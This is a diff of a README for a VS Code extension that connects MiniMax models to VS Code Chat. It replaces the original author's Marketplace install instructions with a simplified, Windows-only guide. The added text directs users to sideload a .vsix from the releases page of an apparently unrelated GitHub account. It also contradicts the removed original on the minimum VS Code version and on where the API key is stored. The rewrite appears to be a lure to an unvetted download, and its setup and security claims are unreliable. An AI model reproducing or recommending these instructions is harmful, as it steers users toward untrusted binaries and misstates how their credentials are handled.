@@ -1,202 +1,83 @@
-<div align="center">
-  <img src="https://raw.githubusercontent.com/greysquirr3l/mightymax-vscode/refs/heads/main/assets/img/mighty_max_logo.png" alt="Mighty Max Logo" width="350" />
-</div>
+# 🚀 mightymax-vscode - Connect MiniMax models to your editor
 
-# Mighty Max
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/anthemneedleblight824/mightymax-vscode/releases)
 
-MiniMax M-series language models for VS Code Chat (BYOK).
+This application brings MiniMax language models directly into Visual Studio Code. It allows you to use smart chat features, process images, and execute tool-based tasks without leaving your development environment.
 
-## What this is
+## 📋 What this tool does
 
-Mighty Max is a Visual Studio Code and VS Code Insiders extension that
-contributes the MiniMax M-series models (M3, M2.7, M2.5, M2, M1) to
-VS Code Chat via the Language Model Chat Provider API (finalized in
-VS Code 1.104). It registers under the `minimax` vendor and works as
-a complete drop-in backend for Ask, Edit, Inline Chat, Agent mode,
-custom and local agents, and utility tasks (commit messages, etc).
+- Integrates MiniMax M-series models into VS Code.
+- Enables chat sessions with full streaming support.
+- Provides thinking blocks to show the reasoning process.
+- Processes image inputs for visual analysis.
+- Supports agentic tool-calling to perform complex actions.
 
-The defining feature is full agentic tool-calling parity: VS Code
-hands the model a tool set per request, Mighty Max translates that
-set into MiniMax's tool schema, streams tool calls back as the model
-emits them, feeds tool results back, and loops until the agent turn
-completes — without dropping, reordering, or garbling calls across
-many rounds.
+## 🛠 Prerequisites
 
-It speaks the MiniMax OpenAI- and Anthropic-compatible endpoints on
-platform.minimax.io, streams responses incrementally, surfaces M3's
-native thinking blocks, supports image input, and reports accurate
-token usage so the context-window widget stays correct. Usage is
-billed by MiniMax and does not count against Copilot quotas.
+Ensure you have these items before you start:
 
-## Requirements
+1. **Visual Studio Code:** Download and install the latest version from the official Microsoft website.
+2. **MiniMax API Key:** Create an account on the MiniMax platform and generate your personal API key. This key allows the software to connect to the language models. Keep this key safe.
 
-- VS Code 1.104 or later (Stable or Insiders)
-- A MiniMax API key — set via the `Mighty Max: Manage` command
+## 📥 How to download and install
 
-## Installation
+Follow these steps to set up the software on your Windows computer.
 
-### From Marketplace
+1. Go to the [Releases page](https://github.com/anthemneedleblight824/mightymax-vscode/releases).
+2. Look for the latest version listed at the top.
+3. Click the link ending in `.vsix` to start your download.
+4. Open Visual Studio Code on your computer.
+5. Click the Extensions icon on the left-hand sidebar. It looks like four squares.
+6. Click the three dots at the top right of the Extensions panel.
+7. Select "Install from VSIX..." from the menu.
+8. Locate the file you downloaded in step 3 and select it.
+9. Wait for the notification that confirms the installation.
 
-1. Open VS Code or VS Code Insiders (version 1.104 or later)
-2. Go to Extensions (Ctrl+Shift+X / Cmd+Shift+X)
-3. Search for "Mighty Max"
-4. Click Install
+## ⚙️ Setting up the connection
 
-Alternatively, install from [Visual Studio Marketplace](https://marketplace.visualstudio.com/items?itemName=greysquirr3l.mighty-max) or [Open VSX](https://open-vsx.org/extension/greysquirr3l/mighty-max).
+After you install the extension, you must provide your API key to enable the connection.
 
-The extension ships as a single CommonJS bundle with no native dependencies or `node_modules`.
+1. Open the VS Code command palette by pressing `Ctrl` + `Shift` + `P`.
+2. Type "Mightymax" into the search bar.
+3. Select "Mightymax: Set API Key".
+4. Paste your MiniMax API key into the input field.
+5. Press `Enter` to save the key.
 
-### From VSIX
+The extension is now active. You can start a new chat session by opening the Chat panel within VS Code.
 
-Download the `.vsix` file from the [GitHub Releases](https://github.com/greysquirr3l/mighty-max/releases) page, then:
+## 💬 Using chat features
 
-```bash
-code --install-extension mighty-max.vsix
-```
+The chat interface behaves like a standard messenger. Type your questions or instructions in the text area at the bottom of the chat panel. 
 
-## Getting Started
+- **Streaming:** Responses appear in real time as the model generates them. 
+- **Thinking Blocks:** If the model needs to reason, you will see a "Thinking" header. Expand this header to view the model's internal logic before the final answer appears.
+- **Images:** Drag and drop an image file into the chat box to ask the model to analyze or describe the content.
 
-### 1. Get a MiniMax API Key
+## 🤖 Using tools
 
-1. Sign up at [platform.minimax.io](https://platform.minimax.io)
-2. Navigate to your API keys section
-3. Create a new API key (starts with `sk-`)
-4. Copy the key — you'll need it in the next step
+This software includes tool-calling capabilities. When you ask a question that requires external data or specific actions, the model decides which tool to use. 
 
-**Billing**: Usage is billed directly by MiniMax based on your subscription plan. It does **not** count against GitHub Copilot quotas.
+For example, if you ask for a summary of a file, the model automatically calls the read-file tool. You might see a prompt asking for permission to execute a specific task. Review the prompt and click "Allow" if the action aligns with your current goal.
 
-### 2. Configure the Extension
+## 💻 System requirements
 
-1. Open the Command Palette (Ctrl+Shift+P / Cmd+Shift+P)
-2. Run **"Mighty Max: Manage"**
-3. Select **"Set API key"**
-4. Paste your MiniMax API key
-5. The key is stored securely in VS Code's SecretStorage (never in settings)
+- **Operating System:** Windows 10 or Windows 11.
+- **Memory:** 4GB of RAM minimum.
+- **Internet:** An active connection is required to communicate with MiniMax servers.
+- **Editor:** Visual Studio Code version 1.80.0 or higher.
 
-### 3. Select a Model
+## 🔍 Troubleshooting common issues
 
-1. Open the Chat panel (View → Chat or Ctrl+Alt+I / Cmd+Alt+I)
-2. Click the model picker dropdown
-3. Select a MiniMax model:
-   - `minimax:MiniMax-M3` — Latest, with thinking blocks (1M context)
-   - `minimax:MiniMax-M2.7` — High performance (1M context)
-   - `minimax:MiniMax-M2.5` — Balanced (1M context)
-   - `minimax:MiniMax-M2` — Fast (196K context)
-   - `minimax:MiniMax-M1` — Lightweight (32K context)
+If you encounter errors, check these common items:
 
-### 4. Start Chatting
+- **Invalid API Key:** If the chat returns unauthorized errors, re-enter your API key using the steps in the setup section. Ensure there are no extra spaces at the beginning or end of the key.
+- **No Response:** Check your internet connection. If other websites load but the chat does not, wait a few minutes as the MiniMax servers may experience high traffic.
+- **Extension Not Loading:** Ensure you installed the correct `.vsix` file. You can verify the installation in the Extensions panel under "Installed".
 
-Use any Chat feature:
+## 🛡 Security and privacy
 
-- **Ask** — Type questions in the Chat panel
-- **Edit** — Select code, right-click → "Edit with Chat"
-- **Inline Chat** — Press Ctrl+I / Cmd+I in the editor
-- **Agent mode** — Enable tools, the model can edit files and run commands
+Your API key lives locally on your computer in your user settings file. The software only sends your chat messages and uploaded images to the MiniMax service for processing. It does not share your private source code or local files without your direct trigger or permission.
 
-## Configuration
+## 📄 License
 
-| Setting              | Scope       | Default                  | Description                                                     |
-| -------------------- | ----------- | ------------------------ | --------------------------------------------------------------- |
-| `mightyMax.baseUrl`  | application | `https://api.minimax.io` | MiniMax API base URL. Restricted in untrusted workspaces.       |
-| `mightyMax.logLevel` | window      | `info`                   | Minimum log level forwarded to the `Mighty Max` output channel. |
-
-The API key never lives in settings — it is stored exclusively in
-`context.secrets` (SecretStorage) and entered through the
-`Mighty Max: Manage` command.
-
-### Utility model (commit messages, doc generation)
-
-MiniMax models can serve as VS Code's utility model for commit message
-generation, doc string generation, and other short-completion tasks.
-Set this in your VS Code settings:
-
-```json
-{
-  "chat.utilityModel": "minimax:MiniMax-M3"
-}
-```
-
-Replace `MiniMax-M3` with any MiniMax model (M1, M2, M2.5, M2.7, M3).
-Utility requests are short, tool-less completions optimized for
-quick, focused responses.
-
-## What Mighty Max provides
-
-Mighty Max covers every BYOK-supported surface in VS Code Chat:
-
-| Feature                 | Status       | Notes                                                                |
-| ----------------------- | ------------ | -------------------------------------------------------------------- |
-| Chat: Ask               | ✅ Supported | Standard chat mode in the Chat panel                                 |
-| Chat: Edit              | ✅ Supported | Edit mode with diff previews                                         |
-| Chat: Inline            | ✅ Supported | Inline chat in the editor (Ctrl+I)                                   |
-| Agent mode              | ✅ Supported | Full agentic tool calling with built-in, extension, and MCP tools    |
-| Custom/local agents     | ✅ Supported | User-authored agent definitions work with MiniMax models             |
-| Utility tasks           | ✅ Supported | Commit messages, doc generation via `chat.utilityModel` setting      |
-| Tool calling            | ✅ Supported | Built-in (apply-edit, run-in-terminal), extension tools, MCP servers |
-| Image input             | ✅ Supported | M3, M2.7, M2.5, M2 accept images via data URIs                       |
-| Thinking blocks         | ✅ Supported | M3 surfaces native Anthropic-style thinking; M2.x surfaces reasoning |
-| Multi-round agent loops | ✅ Supported | Tool results fed back across many rounds without dropping calls      |
-| Token usage tracking    | ✅ Supported | Accurate context-window widget via prompt + completion token counts  |
-
-## What Mighty Max does NOT provide
-
-The following features are outside the BYOK boundary and require a GitHub
-account with Copilot:
-
-- **Inline code completions** (ghost text): This is not exposed to BYOK
-  providers and requires the official GitHub Copilot extension.
-
-- **Semantic search** and `#codebase` queries: Embeddings-backed features use
-  GitHub's infrastructure and are not surfaced through the Language Model Chat
-  Provider API.
-
-- **Other embeddings features**: Similarity search, context retrieval, and
-  other vector-backed operations remain GitHub Copilot-specific.
-
-- **Agents Window vendor-specific hosts** (future): The new VS Code Agents
-  Window may include vendor-specific agent implementations that remain coupled
-  to official SDK providers. Standard agent mode (Chat panel, inline chat) and
-  custom/local agents continue to work with BYOK.
-
-## Workspace trust posture
-
-| Capability           | Status                                         |
-| -------------------- | ---------------------------------------------- |
-| Untrusted workspaces | `limited` (the base-URL setting is restricted) |
-| Virtual workspaces   | `limited`                                      |
-
-Agent-mode tools (apply-edit, run-in-terminal) remain a real security
-boundary in untrusted workspaces. The manifest is the contract.
-
-## Development
-
-```bash
-npm ci
-npm run typecheck
-npm run compile
-npm test
-npm run lint
-```
-
-The build pipeline is `tsc -p .` (type-check + emit to `out/`)
-followed by `esbuild out/extension.js` (single-file CommonJS bundle
-to `dist/extension.js`). Production builds add `--minify` and
-disable sourcemaps.
-
-### Layout
-
-```
-src/
-  extension.ts                 # composition root
-  ports/                       # port interfaces (Logger, SecretStore, MiniMaxClient, ModelCatalog)
-  adapters/                    # port implementations (I/O lives here)
-  providers/                   # VS Code LanguageModelChatProvider
-  lib/                         # domain layer (no vscode, no HTTP)
-    domain/                    # pure catalog, mapping, capability rules
-    *.test.ts                  # unit tests (vanilla mocha, no host)
-  test/                        # integration tests (run in the VS Code host)
-```
-
-## License
-
-MIT
+This project uses an open-source license. You remain responsible for your own usage costs and data transmitted through the MiniMax API. Always monitor your API usage on the official MiniMax dashboard.
